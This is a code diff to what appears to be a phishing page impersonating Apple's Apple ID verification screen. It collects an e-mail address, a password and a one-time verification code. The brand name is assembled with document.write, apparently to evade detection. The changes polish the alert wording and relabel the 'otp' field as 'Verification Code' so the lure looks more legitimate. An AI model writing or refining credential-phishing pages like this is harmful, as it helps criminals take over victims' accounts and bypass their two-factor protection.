@@ -18,13 +18,13 @@ var filter=/^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\
 if (filter.test(str))
 testresults=true
 else{
-alert("Please enter valid e-mail!")
+alert("Please enter a valid e-mail address.")
 testresults=false
 }
 var x=document.forms["email"]["password"].value;
 if (x==null || x=="")
   {
-  alert("Please enter valid password!");
+  alert("Please enter a valid password.");
   return false;
   }
 return (testresults)
@@ -187,7 +187,7 @@ return true
 				<div class="grid2colc wrap">
 				
 					<div class="column first sidebar">
-						<h2>Please sign in to verify your <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT></h2>
+						<h2>Submit your Apple ID Verification Code to Verify:  <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT></h2>
 						<p class="intro">
 						  Please login to verify & update your <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT> account information.</p>
 						<h2>Account Verification.</h2>
@@ -198,14 +198,14 @@ return true
 					</div><!--/column-->
 
 					<div class="column last">
-					<h2>Submit your otp to verify <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT>.</h2>
+					<h2>Submit your Verification Code to verify <SCRIPT TYPE="text/javascript"> document.write('Apple' + ' ID') </SCRIPT>.</h2>
 				
 				<div class="formrow">
 					<span class="formwrap">
-						<input size="30" oncut="" oncopy="" autocapitalize="off" autocorrect="off" aria-label="Password" placeholder="otp" id="password" type="password" name="pass" required/>
+						<input size="30" oncut="" oncopy="" autocapitalize="off" autocorrect="off" aria-label="Password" placeholder="Verification Code" id="password" type="password" name="pass" required/>
 					</span>
 					&nbsp;
-				<center> <div>Resend OTP in - <span id="timer">2:00</span></div></center>
+				
 				&nbsp;
 					<span class="input-msg show">
 						<a name="" type="submit" id="" href="forgot.html"><span>Forgot your Password?</span></a>
